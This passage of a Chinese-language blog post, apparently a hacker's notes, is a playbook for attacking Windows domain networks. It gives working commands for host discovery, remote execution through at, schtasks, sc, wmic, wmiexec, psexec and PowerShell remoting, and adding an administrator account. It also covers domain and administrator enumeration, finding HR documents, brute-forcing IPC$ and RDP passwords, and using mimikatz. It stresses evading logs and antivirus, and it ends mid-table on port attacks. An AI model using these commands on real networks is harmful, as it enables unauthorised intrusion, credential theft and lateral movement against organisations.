+<p>nbtscan扫描整个网络:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nbtscan -r 192.168.200.0/24</span><br></pre></td></tr></table></figure>
+
+<p>ping 扫描内网存活主机：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /l %i in (1,1,255) do @ping 192.168.200.%i -w 1 -n 1 | find /i&quot;ttl&quot;</span><br></pre></td></tr></table></figure>
+
+<p>域机器对应的IP:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FOR /F &quot;eol=- tokens=1 delims=\ &quot; %a IN(&apos;net view&apos;) DO @(echo name: %a, ip: &amp; ping %a -w 1 -n 1 | find /i &quot;ttl&quot; &amp; echo.)</span><br></pre></td></tr></table></figure>
+
+<p>找主机名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /l %i in (1,1,255) do @ping -a 192.168.200.%i -w 1 -n 1 | find /i &quot;Pinging&quot;</span><br></pre></td></tr></table></figure>
+
+<p>找B段：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /l %i in (1,1,255) do @ping -a 10.0.%i.1 -w 1 -n 1 | find /i &quot;Pinging&quot;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>将<code>Pinging</code>改成<code>Ping</code>就可以适用于Win7</p>
+</blockquote>
+<h3 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h3><h5 id="at（系统权限）"><a href="#at（系统权限）" class="headerlink" title="at（系统权限）"></a>at（系统权限）</h5><p>利用计划任务<code>at</code>命令，常用的方法（<strong>系统权限</strong>）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net time</span><br><span class="line"></span><br><span class="line">at \\127.0.0.1 23:00 c:\winnt\system32/viliosn.exe</span><br><span class="line"></span><br><span class="line">at \\127.0.0.1 1 delete /yes #删除本机1号任务</span><br></pre></td></tr></table></figure>
+
+<h4 id="schtasks-用户权限和系统权限都可以"><a href="#schtasks-用户权限和系统权限都可以" class="headerlink" title="schtasks(用户权限和系统权限都可以)"></a>schtasks(用户权限和系统权限都可以)</h4><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /tn asp_net /tr "c:\windows\system32\<span class="built_in">cmd</span>.exe /c <span class="built_in">cmd</span>" /sc once /st <span class="number">00</span>:<span class="number">00</span> /S ip /RU System /u user /p password</span><br><span class="line"></span><br><span class="line">schtasks /run /tn asp_net /S ip /u user /p password</span><br><span class="line"></span><br><span class="line">schtasks /F /delete /tn asp_net /S ip /u user /p password</span><br></pre></td></tr></table></figure>
+
+<h4 id="sc"><a href="#sc" class="headerlink" title="sc"></a>sc</h4><h5 id="系统权限的sc用法"><a href="#系统权限的sc用法" class="headerlink" title="系统权限的sc用法"></a>系统权限的sc用法</h5><p>利用服务工具，指定<strong>用户权限启动</strong></p>
+<p>在<code>192.130.16.22</code>上创建一个xxoox的服务，程序执行命令为<code>cmd.exe /c start c:\programdata\a+.bat</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\192.130.16.22 create xxoox binPath= &quot;cmd.exe /c start c:\programdata\a+.bat&quot;</span><br></pre></td></tr></table></figure>
+
+<p>执行xxoox的服务，执行成功可能会提示错误1053，不宜作为启动项，一般用用户权限也是临时的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sc \\192.130.16.22 start xxoox</span><br><span class="line"></span><br><span class="line">sc \\192.130.16.22 delete xxoox</span><br></pre></td></tr></table></figure>
+
+<h5 id="指定用户权限启动的用法"><a href="#指定用户权限启动的用法" class="headerlink" title="指定用户权限启动的用法"></a>指定用户权限启动的用法</h5><p>在<code>192.130.16.22</code>上指定<code>administrator</code>账户创建一个<code>adminsec</code>服务：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sc \\192.130.16.22 create adminsec binpath = “c:\pass.exe” obj= “adminsec\administrator” passwrod= adminsec</span><br><span class="line"></span><br><span class="line">sc \\192.130.16.22 start adminsec</span><br></pre></td></tr></table></figure>
+
+<h4 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a>wmic</h4><p>WMI 的全称是 Windows Management Instrumentation，它出现在所有的 Windows 操作系统中，由一组强大的工具集合组成，用于1. 管理本地或远程的 Windows 系统。当攻击者使用wmiexec来进行攻击时，Windows系统默认不会在日志中记录这些操作，这意味着可以做到攻击无日志，同时攻击脚本无需写入到磁盘，具有极高的隐蔽性。越来越多的APT事件中也出现了WMI攻击的影子，利用WMI可以进行信息收集、探测、反病毒、虚拟机检测、命令执行、权限持久化等操作。(奇淫技巧可见<a href="http://2014.hackitoergosum.org/slides/day1_WMI_Shell_Andrei_Dumitrescu.pdf" target="_blank" rel="noopener">wmi shell</a>)</p>
+<p>常见的WMI攻击工具：</p>
+<ul>
+<li><code>PTH-WMIS (最早wmi攻击的工具，单条命令执行，无回显，需要pth-smbget配合读取结果)</code></li>
+<li><code>impackets wmiexec(Linux跨window经常用)</code></li>
+<li><code>wmiexec.vbs (国人制造 为了回显会写文件)</code></li>
+<li><code>Invoke-WmiCommand&amp;Invoke-PowerShellWmi</code></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#在远程系统上执行 bat 脚本</span><br><span class="line">wmic /node:192.168.17.138 /user:test /password:!@#123QWE process call create c:\programdata\test.bat</span><br><span class="line"></span><br><span class="line">###在远程系统上执行单条命令</span><br><span class="line">wmic /node:192.168.17.138 /user:test /password:!@#123QWE process call create &quot;cmd.exe /c net user test1 !@#123QWE /add &amp;&amp; net localgroup administrators test1 /add</span><br><span class="line"></span><br><span class="line">#在远程系统上运行exe文件</span><br><span class="line">C:\Users\DC&gt;wmic /node:192.168.200.20 /user:web\administrator /password:Web12345</span><br><span class="line"> process call create &quot;cmd.exe /c calc.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>工具说明:</strong></p>
+<ol>
+<li>需要远程系统启动 Windows Management Instrumentation 服务，开放135端口</li>
+<li>远程系统的本地安全策略的“网络访问: 本地帐户的共享和安全模式”应设为“经典-本地用户以自己的身份验证”</li>
+<li>wmic 会以管理员权限在远程系统上执行命令</li>
+<li>防火墙开启将无法连接</li>
+<li>如果报错 “Invalid Global Switch” ，用双引号把包含<code>-</code>的结点括起来即可正常执行。</li>
+</ol>
+<p><img src="http://b404.xyz/img/hack/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/post/92aa573b-2e90-4248-88c5-dd23cb48ae5b.png" alt="img"></p>
+<h4 id="wmiexec"><a href="#wmiexec" class="headerlink" title="wmiexec"></a>wmiexec</h4><p>WMI 可以远程执行命令，大牛使用VBS脚本调用WMI来模拟 psexec 的功能，于是乎 WMIEXEC 就诞生了。基本上psexec 能用的地方，这个脚本也能够使用。</p>
+<p><strong>常用命令:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">###获取半交互式shell</span><br><span class="line">cscript.exe //nologo wmiexec.vbs /shell 192.168.17.138 test !@#123QWE</span><br><span class="line">###在远程系统上执行单条命令</span><br><span class="line">cscript.exe wmiexec.vbs /cmd 192.168.17.138 test !@#123QWE &quot;cmdkey /list&quot;</span><br><span class="line">###在远程系统上执行 bat 脚本</span><br><span class="line">cscript.exe wmiexec.vbs /cmd 192.168.17.138 test !@#123QWE c:\programdata\test.bat</span><br></pre></td></tr></table></figure>
+
+<p><em>其它参数:</em></p>
+<ul>
+<li><code>-wait5000</code> 表示这个命令等待5s后再读取结果，用于运行“运行时间长”的命令。</li>
+<li><code>-persist</code> 程序会在后台运行，不会有结果输出，而且会返回这个命令进程的 PID，方便结束进程，用于运行 nc 或者木马程序。</li>
+</ul>
+<p>下面这段代码在脚本的一开始，是控制结果文件路径、文件名、以及默认代码执行时间的，可以自行更改。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Const Path = &quot;C:\&quot;</span><br><span class="line">Const FileName = &quot;wmi.dll&quot;</span><br><span class="line">Const timeOut = 1200</span><br></pre></td></tr></table></figure>
+
+<p><strong>工具说明:</strong></p>
+<ul>
+<li>需要远程系统启动 Windows Management Instrumentation 服务，开放135端口</li>
+<li>远程系统的本地安全策略的“网络访问: 本地帐户的共享和安全模式”应设为“经典-本地用户以自己的身份验证”</li>
+<li>wmicexec.vbs 会以管理员权限在远程系统上执行命令</li>
+<li>virustotal 显示 wmiexec.vbs 会被 Kaspersky、Symantec 和 ZoneAlarm 查杀。</li>
+</ul>
+<h4 id="impackets-wmiexec"><a href="#impackets-wmiexec" class="headerlink" title="impackets wmiexec"></a>impackets wmiexec</h4><p>使用impackets wmiexec执行命令测试，执行命令可以回显。在Linux跨window渗透时候经常使用。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#登陆远程机器</span><br><span class="line">python wmiexec.py administrator:Web12345@192.168.63.150</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://b404.xyz/img/hack/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/post/1d54a2c2-f7f9-4a3d-9464-953618fe1581.jpg" alt="img"></p>
+<h4 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h4><p><em>常用命令</em></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">###获取管理员用户权限的交互式 shell</span><br><span class="line">psexec \\192.168.17.138 -u Administrator -p !@#123QWE cmd</span><br><span class="line"></span><br><span class="line">###获取普通用户权限的交互式 shell，原因参见 LocalAccountTokenFilterPolicy,要想获取管理员权限 shell ，需要添加 -h 参数。</span><br><span class="line">psexec \\192.168.17.138 -u test -p !@#123QWE cmd</span><br><span class="line"></span><br><span class="line">###在远程系统上以 system 权限执行单条命令，有时回显只有一行，原因尚不清楚。</span><br><span class="line">psexec \\192.168.17.138 -u Administrator -p !@#123QWE -s cmd /c &quot;quser&quot;</span><br><span class="line"></span><br><span class="line">###在远程系统上执行 bat 脚本</span><br><span class="line">psexec \\192.168.17.138 -u Administrator -p !@#123QWE c:\programdata\test.bat</span><br><span class="line"></span><br><span class="line">###拷贝文件到远程机器并以交互方式运行，运行结束后会删除</span><br><span class="line">psexec \\192.168.17.138 -c C:\Users\test\Desktop\GetHashes.exe</span><br></pre></td></tr></table></figure>
+
+<p><em>其它参数</em></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">–accepteula 第一次运行会弹框,输入这个参数便不会弹框</span><br><span class="line">-s 以 “nt authority\system” 权限运行远程进程</span><br><span class="line">-h 如果可以，以管理员权限运行远程进程</span><br><span class="line">-d 不等待程序执行完就返回，请只对非交互式应用程序使用此选项</span><br><span class="line">\\ip 可以替换成 @ip.txt (存放多个 ip 的文本)，可以批量执行命令</span><br></pre></td></tr></table></figure>
+
+<p><em>工具说明</em></p>
+<ul>
+<li>需要远程系统开启 ADMIN$ 共享</li>
+<li>建立 ipc 连接后可以不指定用户名和密码</li>
+<li>不能仅拷贝文件不执行，只需要拷贝时可以建立 ipc 连接后c opy</li>
+<li>在启动psExec建立连接之后，远程系统上会被安装一个服务：PSEXESVC。安装服务会留下日志，而且psexec退出时有可能服务删除失败，所以不推荐使用 psexec。</li>
+</ul>
+<h4 id="PsRemoting"><a href="#PsRemoting" class="headerlink" title="PsRemoting"></a>PsRemoting</h4><p>PowerShell远程命令执行基于WinRM。WinRM指的是Windows远程管理服务，它会监听HTTP(5985)、HTTPS(5986)，不过此服务除了Windows Server 2012及R2默认启用外，其他默认都是禁用的。管理员为了方便对服务器的远程管理，也许将此端口开启，这种事就像内网弱口令一样，做渗透嘛，什么奇迹都有可能发生。</p>
+<p>利用PowerShell渗透可以绕过杀软、绕过白名单防护设备，并且还可以得到返回的数据，简直是杀人越货神器。默认禁用PS。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#先开启执行策略</span><br><span class="line">set-executionpolicy unrestricted</span><br><span class="line">#在目标机器上开启ps远程功能</span><br><span class="line">enable-psremoting</span><br><span class="line">#开启远程连接</span><br><span class="line">Enter-PSSession 192.168.200.20 -Credential  administrator</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://b404.xyz/img/hack/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/post/5f86bde0-3bdb-4c2e-995e-dc1e80ffbbd0.png" alt="img"></p>
+<h2 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h2><ul>
+<li>收集域以及域内用户信息</li>
+<li>收集域内域控制器信息</li>
+<li>收集域控上域用户登录日志信息</li>
+<li>收集域内所有用户名以及全名、备注等信息</li>
+<li>收集域内工作组信息</li>
+<li>收集域管理员帐号信息</li>
+<li>收集域内网段划分信息</li>
+<li>收集域内组织单位信息</li>
+</ul>
+<h3 id="服务器-机器-定位"><a href="#服务器-机器-定位" class="headerlink" title="服务器(机器)定位"></a>服务器(机器)定位</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">不管是做外网还是内网，信息收集都是很有必要的第一步，当我们控下一台机器的时候，内网是个什么结构？这台机器是一个什么角色？使用机器的人是一个什么角色？上面装的什么杀毒？机器是怎么上网的？机器是笔记本，还是台式机？等等等等。。。</span><br><span class="line"></span><br><span class="line">ipconfig /all</span><br><span class="line">//用来查看当前机器的网络环境,判断是工作组,还是域环境.网段是怎么划分的,每个段有多少台机器,DNS服务器IP是多少。</span><br><span class="line"></span><br><span class="line">net view</span><br><span class="line">//用来查看跟本机有关联的机器名.注意,是跟本机有关联的机器,而不是一个段的机器.</span><br><span class="line"></span><br><span class="line">net view /domain</span><br><span class="line">//用来查看当前网络环境存在几个域.</span><br><span class="line"></span><br><span class="line">net view /domain:xxxx</span><br><span class="line">//查看xxx域中存在的跟本机有关联的机器.</span><br><span class="line"></span><br><span class="line">net group &quot;domain admins&quot; /domain</span><br><span class="line">//查看域内管理员.</span><br><span class="line"></span><br><span class="line">net user /domain</span><br><span class="line">//查看域内的用户名.</span><br><span class="line"></span><br><span class="line">net group &quot;domain computers&quot; /domain</span><br><span class="line">//查看域内所有机器名.</span><br><span class="line"></span><br><span class="line">net time /domain</span><br><span class="line">//查看域时间及域服务器的名字</span><br><span class="line"></span><br><span class="line">Nslookup -type=SRV _ldap._tcp.</span><br><span class="line">//查询DNS</span><br><span class="line"></span><br><span class="line">netstat</span><br><span class="line">//查看连接信息.</span><br><span class="line"></span><br><span class="line">net group &quot;Domain Controllers&quot; /domain</span><br><span class="line">//查找域控</span><br><span class="line"></span><br><span class="line">nbtstat</span><br><span class="line">//由IP地址得到机器名</span><br></pre></td></tr></table></figure>
+
+<p>上面我们已经得到了一些内网信息,现在我们就需要好好分析一下了.</p>
+<p>1、分析出内部网络是怎么划分的.是按照部门划分的网络段,还是按照楼层,还是按照地区划分.</p>
+<p>2、分析出内部网络机器名的命名规则.特别是个人机,这对选取有价值目标很重要.不过有些内网是采用的无规则命名法,这也是正常的.但是一般还是有规律的.</p>
+<p>3、分析出内部网络重要人的电脑名.这些重要人物一般在对外网站上都会有一些介绍的.再根据机器命名规则,就可以大概分析得出这些机器.这里要注意,有些人有多个电脑哦.还有些人用的是笔记本的.</p>
+<p>4、分析域结构,有些内部网络是多层域结构,而且还是多级域结构,这样,我们就需要先分析出,现在这电脑所在域是几级子域,这个子域域控以及根域域控是哪些,还有其他域的域控是哪些.一般域控命名都有DC字样.</p>
+<h3 id="文件定位"><a href="#文件定位" class="headerlink" title="文件定位"></a>文件定位</h3><p>服务器定位总结出文件定位的大致思路：</p>
+<ul>
+<li>定位人力资源主管个人机</li>
+<li>定位人力资源相关文档存放位置</li>
+<li>从人力资源文档中找相关人</li>
+<li>定位相关人的机器</li>
+<li>监视相关人工作时存放文档的位置</li>
+<li>列出存放文档服务器的目录</li>
+</ul>
+<p>文件定位需要注意的点：</p>
+<ul>
+<li>产品名称</li>
+<li>内部名称</li>
+<li>项目负责人</li>
+<li>项目团队</li>
+<li>生产部（分公司，工厂，代工厂）</li>
+</ul>
+<p>经验：</p>
+<ul>
+<li>FTP</li>
+<li>SMB</li>
+<li>DC\NETLOGON\</li>
+<li>产品管理系统（仓库管理系统）</li>
+<li>各种数据库</li>
+<li>其他服务器（分公司，工厂，代工厂）</li>
+</ul>
+<blockquote>
+<p>定位文件服务器请参考上一节定位服务器（机器），定位到文件服务器和某个人，对于文件定位来说应该会事半功倍。这里就不过多叙述了。</p>
+</blockquote>
+<h3 id="管理员定位"><a href="#管理员定位" class="headerlink" title="管理员定位"></a>管理员定位</h3><p><strong>0x01工具：</strong></p>
+<ul>
+<li><p><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon" target="_blank" rel="noopener">psloggedon.exe</a>:通过检验注册表里HKEY_USERS的key值来查询谁登陆过机器，同样也调用到了NetSessionEnum API。某些功能需要管理员权限</p>
+</li>
+<li><p><a href="http://www.joeware.net/freetools/index.htm" target="_blank" rel="noopener">netsess.exe</a>:调用NetSessionEnum API，并且在远程主机上无需管理员权限。</p>
+</li>
+<li><p><a href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn" target="_blank" rel="noopener">PVEFindADUser.exe</a>:用于枚举域用户以及登陆过特定系统的用户，需要管理员权限</p>
+</li>
+<li><p><a href="https://github.com/mubix/netview" target="_blank" rel="noopener">netview.exe</a>:使用WinAPI枚举系统，利用NetSessionEnum来找寻登陆sessions,利用NetShareEnum来找寻共享 , 利用 NetWkstaUserEnum 来枚举登陆的用户。它也能查询共享入口和有价值用户，还能使用延迟和抖动。绝大部分功能不需要管理员权限。</p>
+</li>
+<li><p><a href="https://github.com/fdiskyou/hunter" target="_blank" rel="noopener">hunter</a>:hunter是一款利用 Windows API 调用来枚举跳板机上的用户登录信息的工具</p>
+</li>
+<li><p>Nmap的NSE脚本</p>
+<p>：如果你有域账户或者本地账户，你可以使用Nmap的smb-enum-sessions.nse 引擎来获取远程机器的登录session，并且不需要管理员权限</p>
+<ul>
+<li><code>smb-enum-domains.nse</code>对域控制器进行信息收集扫描，可以获取主机信息，用户，密码策略可以用的用户等</li>
+<li><code>smb-enum-users.nse</code>在进行域渗透的时候，有了域内某台主机的权限，但是权限有限，不能获取更多的域用户信息的时候，可以借助这个脚本对域控制器进行扫描</li>
+<li><code>smb-enum-shares.nse</code>遍历远程主机的共享目录</li>
+<li><code>smb-enum-processes.nse</code>通过smb对主机的系统进程进行遍历，通过这些信息，可以知道目标主机上运行软件信息，选择合适的漏洞或者规避防火墙以及杀毒软件。</li>
+<li><code>smb-enum-sessions.nse</code>通过smb获取域内主机的用户登录session，查看当前是否有用户登录，对于我们抓取用户hash以及避免同时登陆被用户发现。</li>
+<li><code>smb-os-discovery.nse</code>通过smb协议来收集目标主机的操作系统，计算机名，域名，全称域名，域林名称，NetBIOS机器名，NetBIOS域名，工作组，系统时间。</li>
+</ul>
+</li>
+</ul>
+<p><strong>0x02 Active Directory:</strong></p>
+<p>通过AD信息来识别一些连接到服务器的用户：</p>
+<ul>
+<li><a href="http://www.harmj0y.net/blog/redteaming/trusts-you-might-have-missed/" target="_blank" rel="noopener">http://www.harmj0y.net/blog/redteaming/trusts-you-might-have-missed/</a></li>
+<li><a href="http://www.sixdub.net/2014/11/offensive-event-parsing-bringing-home-trophies/" target="_blank" rel="noopener">http://www.sixdub.net/2014/11/offensive-event-parsing-bringing-home-trophies/</a></li>
+</ul>
+<p><strong>0x03PowerShell：</strong></p>
+<p>针对windows机器，可以考虑用wmi脚本和powershell脚本进行扫描，低频扫描可以很容易的绕过IDS的规则。PowerShell有很多方法Windows Api并且绕过白名单:</p>
+<ul>
+<li><a href="http://www.mottoin.com/89568.html" target="_blank" rel="noopener">http://www.mottoin.com/89568.html</a></li>
+</ul>
+<p><strong>0x04 查找域管理进程：</strong></p>
+<ul>
+<li><a href="https://blog.netspi.com/5-ways-to-find-systems-running-domain-admin-processes/" target="_blank" rel="noopener">https://blog.netspi.com/5-ways-to-find-systems-running-domain-admin-processes/</a></li>
+</ul>
+<hr>
+<h2 id="进攻"><a href="#进攻" class="headerlink" title="进攻"></a>进攻</h2><p>1、内网WEB渗透.内网的WEB,一般情况下是比较容易搞下的,毕竟不像放在公共网络上.有那么大的风险,相对的,管理也就松散一些了.而且,内网的一些服务器是做测试用的,至于哪些服务器是做什么用的,可以通过判断机器名来分析,机器名的命名大多是有规律的.这跟国家风俗有一些习惯,但是也有公司采用无规则命令法,这就很蛋疼.</p>
+<p>2、内网SQL.内网的SQL一般是特别有用的.因为一般域结构的内网,都会比较看重权限.那么一般WEB上都会有登陆验证,这些验证SQL就特别有用了，拿下来,对应人跟机器,后面,你懂的.</p>
+<p>3、抓HASH，弱口令匹配内网机器。一般内网的机器弱口令还是存在的。分析一些内部的常用密码，然后再自己组合一些密码，再用工具去匹配，一般还是有收获的。以前有些HASH还破解不出来，还得依靠HASH注入这些技术，现在有了新东西mimikatz，可以抓取内存的密码，还是直接明文的。容易多了。</p>
+<p>4、内网进攻常用命令整理：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">net use \\IP\ipc$ password /user:username@domain（IPC对方）</span><br><span class="line"></span><br><span class="line">net use \\ip\ipc$ &quot;pwd&quot;  /user:ip\username@domain （解决IPC时遇到权限问题）</span><br><span class="line"></span><br><span class="line">net time \\IP</span><br><span class="line"></span><br><span class="line">at  \\IP</span><br></pre></td></tr></table></figure>
+
+<h3 id="取得合法身份前的攻击"><a href="#取得合法身份前的攻击" class="headerlink" title="取得合法身份前的攻击"></a>取得合法身份前的攻击</h3><h4 id="认证"><a href="#认证" class="headerlink" title="认证"></a>认证</h4><p>攻击Windows常攻击Windows的文件和打印共享服务，这项服务运行在SMB(服务器消息块)上，尝试远程共享加载：试着连接一个共享卷(比如IPC$或C$共享卷)：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.200.21\IPC$ * \u:用户名</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>*表示手动输入密码</p>
+</blockquote>
+<p>也可以使用FOR语句来爆破密码，将<code>tokent.txt</code>的第一个字串赋值给<code>%i</code>（密码），将第二个字串赋值给<code>%j</code>(用户名)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FOR /F &quot;tokens=1,2*&quot; %i in (token.txt) do net use \\192.168.200.21\IPC$ %i /u:%j</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://b404.xyz/img/hack/%E5%86%85%E7%BD%91/net_use_for.png" alt="img"></p>
+<p>也可以使用以下工具进行口令猜测：</p>
+<ul>
+<li><a href="https://packetstormsecurity.com/files/download/31882/enum.tar.gz" target="_blank" rel="noopener">enum</a></li>
+<li><a href="http://www.hoobie.net/brutus/index.html" target="_blank" rel="noopener">Brutus</a></li>
+<li><a href="https://github.com/vanhauser-thc/thc-hydra" target="_blank" rel="noopener">THC Hydra</a></li>
+<li><a href="http://foofus.net/?page-id=51" target="_blank" rel="noopener">Medusa</a></li>
+</ul>
+<p>用enum爆破：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\win2k8\Desktop&gt;enum.exe -D -u Administrator -f credentials.txt 192.168.200.21</span><br></pre></td></tr></table></figure>
+
+<p>有时候也可以直接爆破远程桌面服务。</p>
+<p>用<a href="http://www.hammerofgod.com/resources/downloads/tsgrinder-2.03.zip" target="_blank" rel="noopener">TSGrinder</a>爆破RDP：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\win2k8\Desktop\tsgrinder-2.03&gt;echo Admin 1&gt;a  &amp; tsgrinder.exe -w a -u Administrator -n 1 192.168.200.21 1&gt;out</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>该工具主要针对于XP和2003，当用在win7的时候，需要将注册表<code>HKEY_CURRENT_USER\Software\Microsoft\Windows\Windows Error Reporting\Dont Show UI</code>设为1.</p>
+</blockquote>
+<p>kali下的rdesktop爆破：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop -u Administrator -p token.txt 10.10.10.150</span><br></pre></td></tr></table></figure>
+
+<h4 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h4><p><strong>0x01 nbtscan:</strong> 使用<a href="http://www.unixwiz.net/tools/nbtscan.html" target="_blank" rel="noopener">nbtscan</a>扫描：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nbtstat -m 192.168.200.21</span><br><span class="line"></span><br><span class="line">nbtscan 192.168.200.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://b404.xyz/img/hack/%E5%86%85%E7%BD%91/nbtscan.png" alt="img"></p>
+<blockquote>
+<p>SHARING 表示开放来共享， DC 表示可能是域控，或者是辅助域控U=user猜测此计算机登陆名 IIS 表示运行来web80 EXCHANGE Microsoft Exchange服务 NOTES Lotus Notes服务</p>
+</blockquote>
+<p><strong>0x02:WinScanX:</strong></p>
+<p>WinScanX 需要登录账号能够获取目标很详细的内容。其中还有snmp获取,windows密码猜解(但是容易被杀,nishang中也实现出一个类似的信息获取/Gather/Get-Information.ps1)</p>
+<h5 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h5><table>
+<thead>
+<tr>
+<th>端口号</th>
+<th>端口说明</th>
+<th>攻击技巧</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>21/22/69</td>
+<td>ftp / tftp：文件传输协议</td>
+<td>爆破\嗅探\溢出\后门</td>
+</tr>
+<tr>
+<td>22</td>
+<td>ssh：远程连接</td>
+<td>爆破OpenSSH; 28个退格</td>
+</tr>
+<tr>
+<td>23</td>
+<td>telnet：远程连接</td>
+<td>爆破\嗅探</td>
+</tr>
+<tr>
+<td>25</td>
+<td>smtp：邮件服务</td>
+<td>邮件伪造</td>
+</tr>
+<tr>
+<td>53</td>
+<td>DNS：域名解析系统</td>
+<td>DNS域名传输\ DNS劫持\ DNS缓存投毒\ DNS欺骗\利用DNS隧道技术刺透防火墙</td>
+</tr>
+<tr>
+<td>67/68</td>
+<td>dhcp</td>
+<td>劫持\欺骗</td>
+</tr>
+<tr>
+<td>110</td>
+<td>pop3</td>
+<td>爆破</td>
+</tr>
+<tr>
+<td>139</td>
+<td>samba</td>
+<td>爆破\未授权访问\远程代码执行</td>
+</tr>
+<tr>
+<td>143</td>
